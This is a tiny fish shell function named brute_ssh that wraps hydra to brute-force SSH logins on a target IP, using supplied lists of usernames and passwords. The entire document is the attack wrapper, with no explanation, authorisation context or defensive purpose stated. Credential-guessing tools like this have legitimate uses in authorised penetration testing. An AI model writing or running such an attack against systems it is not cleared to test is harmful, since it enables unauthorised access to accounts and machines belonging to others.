function brute_ssh
    set target_ip $argv[1]
    set user_list $argv[2]
    set password_list $argv[3]
    hydra -L $user_list -P $password_list ssh://$target_ip
end

